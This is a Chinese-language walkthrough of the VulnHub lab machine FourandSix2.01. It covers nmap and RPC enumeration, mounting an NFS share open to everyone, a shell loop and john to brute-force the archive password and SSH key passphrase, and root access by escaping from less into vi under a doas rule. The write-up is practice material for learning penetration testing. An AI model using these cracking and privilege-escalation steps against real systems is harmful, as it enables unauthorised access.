# 靶机信息
FourandSix2.01 是一个简单难度的vulnhub的渗透测试靶机

# 信息收集
## Nmap扫描
```
└─$ nmap -sCV -p22,111,2049 -O --min-rate 10000 192.168.218.211 -oA nmapScan/details
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 20:32 EST
Nmap scan report for 192.168.218.211 (192.168.218.211)
Host is up (0.00061s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          624/udp   mountd
|_  100005  1,3          804/tcp   mountd
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 00:0C:29:39:17:CF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 6.X
OS CPE: cpe:/o:openbsd:openbsd:6
OS details: OpenBSD 6.0 - 6.4
Network Distance: 1 hop
```
没有web端口，是RPC服务，推荐一个 [渗透测试网址](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpcbind.html) ，非常好用，各个端口的渗透测试思路都有。

# 初始信息枚举
枚举一下RPC服务
```
└─$ nmap -sSUC -p111 192.168.218.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 20:57 EST
Nmap scan report for 192.168.218.211 (192.168.218.211)
Host is up (0.00052s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          624/udp   mountd
|_  100005  1,3          804/tcp   mountd
111/udp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          624/udp   mountd
|_  100005  1,3          804/tcp   mountd
MAC Address: 00:0C:29:39:17:CF (VMware)
```
NFS 是专为客户端/服务器设计的系统，使用户能够通过网络无缝访问文件，就好像这些文件位于本地目录中一样。
NFS（尤其是 v2/v3）本身不做强认证，默认信任客户端发来的 UID/GID。也就是说，客户端可以报告“我就是 UID=0（root）”，服务器默认就按 UID=0 处理——这会带来严重风险。为此，NFS 服务端支持若干“映射/压扁（squash）”策略，把远端的某些 UID/GID 映射为“匿名”用户（通常是 nobody），以降低权限滥用风险。

```
└─$ showmount -e 192.168.218.211
Export list for 192.168.218.211:
/home/user/storage (everyone)
```
挂载到本地
` sudo mount -t nfs -o vers=3 192.168.218.211:/home/user/storage ./new_back -o nolock `

里面有一个压缩包，需要密码
```
mkdir -p recovered && while IFS= read -r pw || [ -n "$pw" ]; do printf '[%s] try: %s\n' "$(date +%H:%M:%S)" "$pw"; if 7z t -p"$pw" backup.7z >/dev/null 2>&1; then echo "FOUND: $pw"; 7z x -p"$pw" -y backup.7z -o./recovered; break; fi; done < wordlist.txt
```
没使用工具，正好锻炼一下shell编程能力，再借助AI完善的，由于是单线程爆破，所以不快，大概五分钟才爆出来密码 **chocolate**

解压出来，有一个公私钥，但是登录ssh还需要口令直接爆破
```
┌──(kali㉿kali)-[~/…/vulnhub/FourandSix2.01/new_back/recovered]
└─$ /usr/share/john/ssh2john.py id_rsa > id_hash.txt
                                                                                                                             
┌──(kali㉿kali)-[~/…/vulnhub/FourandSix2.01/new_back/recovered]
└─$ john --wordlist=/usr/share/wordlists/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt id_hash.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
12345678         (id_rsa)     
1g 0:00:00:00 DONE (2025-11-11 22:06) 1.020g/s 32.65p/s 32.65c/s 32.65C/s 123456..121212
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
上面爆破7z密码也直接使用john，一样的步骤。


# 提权
使用私钥和口令成功登录到服务器了，开始提权

shell环境很受限，很多命令都用不了，发现是wheel组，但是sudo用不了，再扒拉扒拉。

再搜索带s位的文件时，发现 **/usr/bin/doas** 问AI是OpenBSD 的 sudo 替代品，用于以受控方式以其他用户/root 执行命令（受 /etc/doas.conf 控制）。

```
fourandsix2$ cat /etc/doas.conf
permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
permit nopass keepenv root as root
```
再推荐一个[提权工具网址](https://gtfobins.github.io/gtfobins/less/)，里面有很多系统程序提权思路。

<img width="1919" height="779" alt="Image" src="https://github.com/user-attachments/assets/665472f0-6406-4323-876b-475eabf2acf4" />

进去之后按v，在 less file 中按 v：less 会查找环境变量 $VISUAL（优先）或 $EDITOR（次之），若都没设则通常回退到 vi（或系统默认编辑器）。

它会把当前正在查看的文件（或若是从标准输入读入的内容，则会把内容写到一个临时文件）交给编辑器打开。

less 暂停并等待编辑器退出；编辑器退出后，less 会返回并通常会检测该文件是否被修改：若修改了，less 会提示/自动重载显示已变更的内容（具体行为取决 less 版本与设置）。

然后就进入vi编辑器了，然后使用命令模式输入**:!/bin/sh**

<img width="1917" height="773" alt="Image" src="https://github.com/user-attachments/assets/ee40f603-8039-428a-80b0-0d00a8ee42a1" />

# 反思
跟以往web入口不同，很新奇，学习到了新的爆破手法。